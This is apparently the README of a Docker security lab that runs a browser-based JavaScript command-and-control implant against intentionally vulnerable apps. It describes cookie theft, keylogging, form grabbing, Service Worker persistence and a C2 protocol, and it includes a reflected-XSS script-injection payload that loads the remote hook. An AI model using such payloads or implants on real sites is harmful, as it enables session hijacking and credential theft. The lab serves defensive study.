# Ghost Lab

**A browser-based Command & Control research environment for studying how modern attacks use nothing but HTTP requests and JavaScript.**

> What if exploits didn't have to be complicated binaries — just something that sends HTTP requests silently, with all logic handled off the target?

## The Idea

Most people think of exploits as compiled binaries, shellcode, or complex payloads that need to touch disk and evade antivirus. But modern attackers increasingly use a simpler approach:

1. **The implant is just JavaScript** — runs in the victim's browser, looks like normal web traffic
2. **All intelligence lives on the attacker's server** — the implant is dumb, it just asks "what should I do next?"
3. **Delivery is through the browser** — XSS, malicious pages, watering holes — no file ever touches disk
4. **Persistence uses browser APIs** — Service Workers survive page navigation and keep the hook alive

This is not theoretical. This is how real threat actors operate today:

- **SocGholish** — Delivers pure JavaScript via fake browser update pages. One of the most active threats globally.
- **Lazarus Group (BeaverTail)** — JavaScript implant distributed through malicious npm packages.
- **WARPWIRE** — JS credential harvester injected into Ivanti VPN login pages during zero-day exploitation.
- **Magecart / FIN6 / FIN7** — JavaScript card skimmers injected into e-commerce payment pages. Billions stolen with `<script>` tags.
- **Kimsuky (TRANSLATEXT)** — Malicious Chrome extension with JS files for form-grabbing, screenshots, and data exfiltration.

*References: MITRE ATT&CK [T1059.007](https://attack.mitre.org/techniques/T1059/007/), [T1185](https://attack.mitre.org/techniques/T1185/)*

## Architecture

The entire attack chain uses only standard web technologies:

```
┌─────────────────────────────────────────────────────────────────┐
│                        ATTACK CHAIN                             │
│                                                                 │
│  1. Victim visits a page with an XSS vulnerability              │
│  2. Attacker injects: <script src="http://c2/hook.js">          │
│  3. hook.js loads — fingerprints the browser environment         │
│  4. Implant registers with C2 server (HTTP POST)                │
│  5. Implant enters polling loop: "Any tasks for me?"            │
│  6. C2 server decides what to do (all logic is server-side)     │
│  7. Implant executes task, sends results back (HTTP POST)       │
│  8. Service Worker installed for persistence across navigation  │
│  9. Browser becomes a persistent recon node inside the network  │
└─────────────────────────────────────────────────────────────────┘

                    ┌──────────────┐
                    │ Victim       │
                    │ Browser      │
                    │              │
                    │  hook.js     │──── GET /api/task ────▶ ┌──────────┐
                    │  (polling)   │◀─── {type: "keylog"} ── │  Ghost   │
                    │              │                          │  C2      │
                    │              │──── POST /api/result ──▶ │  Server  │
                    │              │     {keystrokes: [...]}  │          │
                    │  sw.js       │                          │ Dashboard│
                    │  (persist)   │── heartbeat every 15s ─▶│ (Flask)  │
                    └──────────────┘                          └──────────┘
```

### Why This Approach Works

| Property | Traditional Exploit | Browser-Based C2 |
|----------|-------------------|-------------------|
| **Payload** | Compiled binary, shellcode | JavaScript (text) |
| **Delivery** | Phishing attachment, dropper | XSS, malicious page, watering hole |
| **Disk footprint** | File on disk | Zero — lives in memory/browser |
| **Network traffic** | Custom protocol, encoded C2 | Standard HTTPS — looks like any web app |
| **Detection** | AV signatures, EDR hooks | Almost invisible — it's just a website |
| **Persistence** | Registry keys, scheduled tasks, services | Service Workers, stored XSS |
| **Complexity on target** | High — needs to evade, escalate, persist | Minimal — just fetch() in a loop |
| **Complexity on server** | Moderate | All of it — decision logic, task generation |

### What the Implant Can Do

The implant (`hook.js`) is a single vanilla JavaScript file. No dependencies. No build step. It supports:

| Command | What It Does |
|---------|-------------|
| `steal_cookies` | Exfiltrate `document.cookie` |
| `exfil_localstorage` | Dump localStorage and sessionStorage |
| `exfil_page` | Send back the full page HTML |
| `screenshot` | Map all forms (with values), links, and page metadata |
| `keylog` | Capture keystrokes for N seconds |
| `form_grab` | Intercept form submissions (captures credentials on submit) |
| `exec_js` | Execute arbitrary JavaScript and return the result |
| `inject_html` | Inject HTML/JS into the page DOM |
| `portscan` | Browser port scan using WebSocket timing heuristics |
| `network_discovery` | Discover live hosts on a subnet from the browser |
| `clipboard` | Read clipboard contents |
| `redirect` | Silently redirect the victim to another page |

### Service Worker Persistence

When the implant loads, it attempts to register a Service Worker (`sw.js`). If successful:

- The SW **intercepts every page navigation** on the origin
- It **injects hook.js into every HTML response** — re-hooking the browser on every page load
- It sends a **background heartbeat** to C2 every 15 seconds
- It **survives page refreshes** and navigation within the site
- The implant stays active as long as the user has any tab open on that origin

This means a single XSS injection can lead to persistent access — the attacker doesn't need stored XSS or any file on disk.

## Lab Setup

Everything runs in Docker. One command.

### Prerequisites

- Docker & Docker Compose
- A web browser for testing

### Start the Lab

```bash
docker compose up -d --build
```

### Services

| Service | URL | Purpose |
|---------|-----|---------|
| **Ghost C2** | http://localhost:5000 | Operator dashboard — see agents, send commands, view results |
| **DVWA** | http://localhost:8080 | Vulnerable web app — XSS injection target |
| **Juice Shop** | http://localhost:3000 | OWASP Juice Shop — alternative target |
| **BeEF** | http://localhost:3333/ui/panel | Browser Exploitation Framework (advanced) |

### Run E2E Tests (Dockerized)

Playwright is packaged as a Compose service, so contributors do not need Node/Playwright installed locally.

```bash
docker compose run --rm tests
```

By design, `tests` is in the `test` profile. It is part of the stack definition, but it does not auto-start with `docker compose up -d` because it is a one-shot runner, not a long-lived service.

If you want it started via profile-aware up:

```bash
docker compose --profile test up --build tests
```

### Run the Attack

**1. Set up DVWA**

- Open http://localhost:8080
- Login: `admin` / `password`
- Click "Create / Reset Database" on the setup page
- Login again, go to "DVWA Security" → set to **Low**

**2. Inject the hook**

- Navigate to **XSS (Reflected)**
- Enter in the input field:
  ```
  <script src="http://localhost:5000/hook.js"></script>
  ```

**3. Watch the C2 dashboard**

- Open http://localhost:5000
- An agent appears within seconds
- Click the agent → use command buttons → watch results stream in

**4. Try the commands**

- **Steal Cookies** → See the victim's session cookie
- **Keylog 15s** → Switch to the DVWA tab, type something, come back — keystrokes captured
- **DOM Snapshot** → See every form and link on the page
- **Execute JS** → Run `navigator.userAgent` or any JavaScript
- **Inject HTML** → Inject a phishing overlay or alert box
- **Port Scan** → Scan localhost or internal IPs from the victim's browser

### Stop the Lab

```bash
docker compose down
```

## Project Structure

```
ghost-lab/
├── docker-compose.yaml          # Entire lab — one command startup
├── tests/
│   ├── Dockerfile               # Playwright + Chromium runner image
│   ├── package.json             # Test dependencies
│   └── test-e2e.js              # Full browser validation suite
├── c2/
│   ├── Dockerfile               # Python 3.12 slim
│   ├── requirements.txt         # Flask + Flask-CORS
│   ├── app.py                   # C2 server — API + dashboard
│   ├── static/
│   │   ├── hook.js              # The implant — vanilla JS, no deps
│   │   └── sw.js                # Malicious Service Worker
│   └── templates/
│       └── dashboard.html       # Operator dashboard
├── beef/
│   └── config.yaml              # BeEF configuration
└── test-chain.sh                # API/curl chain validation
```

## How the C2 Protocol Works

The protocol is deliberately simple — just JSON over HTTP:

```
REGISTER (implant → C2)
POST /api/register
{
  "user_agent": "Mozilla/5.0 ...",
  "url": "http://victim-site.com/page",
  "cookies": "session=abc123",
  "screen": "1920x1080",
  "platform": "Win32",
  ...
}
← { "agent_id": "a1b2c3d4", "interval": 3000 }

POLL (implant → C2, every N ms)
GET /api/task/a1b2c3d4
← { "type": "steal_cookies", "task_id": "x1y2z3", "payload": {} }
  or
← { "type": "noop" }

RESULT (implant → C2)
POST /api/result
{
  "agent_id": "a1b2c3d4",
  "task_type": "steal_cookies",
  "task_id": "x1y2z3",
  "data": { "cookies": "session=abc123; admin=true" }
}
← { "status": "ok" }
```

From a network perspective, this looks like a web app making API calls. The traffic is standard HTTP POST/GET with JSON bodies — indistinguishable from legitimate SPA traffic.

## Engineering Notes (Important)

- **Cross-origin sendBeacon exfiltration:** `sendBeacon` with `application/json` can fail cross-origin due to CORS preflight constraints. This lab uses `text/plain` payloads containing JSON for beacon-based form exfil, and server-side fallback JSON parsing on `/api/result`.
- **Browser portscan limits:** WebSocket timing is more practical than `fetch(..., no-cors)` for browser-side scanning, but localhost scans can still produce false positives. Treat results as heuristic reconnaissance, not ground truth.
- **C2 auto-discovery in hook.js:** The implant derives C2 origin from the script URL (`hook.js` source). This keeps payloads portable across localhost, Docker service names, and remote lab hosts.

## Key Concepts Demonstrated

### 1. The Browser Is the Endpoint
Traditional security focuses on protecting the OS — antivirus, EDR, firewalls. But the browser runs arbitrary code (JavaScript) by design. A hooked browser gives an attacker a foothold that most security tools can't see.

### 2. Thin Client, Fat Server
The implant does almost nothing. It's a polling loop that asks the server what to do. All decision-making, targeting logic, and attack orchestration happens server-side. This means:
- The implant is tiny and hard to detect
- The attacker can change tactics without touching the target
- New capabilities are added server-side, not on the victim

### 3. HTTP as a C2 Channel
Every modern application makes HTTP requests. C2 traffic that uses standard HTTPS with JSON payloads blends perfectly with legitimate traffic. There's no custom protocol to fingerprint.

### 4. Browser APIs Are Powerful
From inside a browser, JavaScript can:
- Read cookies and storage (session hijacking)
- Capture keystrokes and form submissions (credential theft)
- Scan internal networks using browser timing heuristics (reconnaissance)
- Modify the page DOM (phishing overlays)
- Register Service Workers (persistence)
- Make requests to internal services the browser can reach (pivoting)

### 5. XSS Severity Is Underestimated
Many organizations treat XSS as "medium severity" because they think it just shows an alert box. This lab demonstrates that a single reflected XSS can lead to:
- Session hijacking
- Credential capture
- Internal network reconnaissance
- Persistent browser access via Service Workers
- Full C2 control of the victim's browser session

## Defensive Takeaways

If you're on the blue team, this lab demonstrates why you need:

- **Content Security Policy (CSP)** — Restrict which scripts can load. `script-src 'self'` would block the external hook.js.
- **HttpOnly cookies** — Prevents JavaScript from reading session cookies.
- **Subresource Integrity (SRI)** — Ensures scripts haven't been tampered with.
- **Service Worker scope restrictions** — Monitor and audit registered Service Workers.
- **Network monitoring** — Look for periodic polling patterns from browsers to unusual endpoints.
- **Input validation and output encoding** — Prevent XSS in the first place.
- **Browser isolation** — Separate browsing contexts for sensitive applications.

## Disclaimer

This project is for **educational and authorized security research only**. It is designed to run in an isolated Docker lab environment against intentionally vulnerable applications.

- Only use against systems you own or have explicit written authorization to test
- Never deploy against production systems or real users
- This demonstrates known attack techniques for defensive awareness

The goal is to understand how browser-based attacks work so we can build better defenses.

## References

- [MITRE ATT&CK T1059.007 — JavaScript Execution](https://attack.mitre.org/techniques/T1059/007/)
- [MITRE ATT&CK T1185 — Browser Session Hijacking](https://attack.mitre.org/techniques/T1185/)
- [BeEF — Browser Exploitation Framework](https://beefproject.com/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN Service Worker API](https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API)

## License

MIT
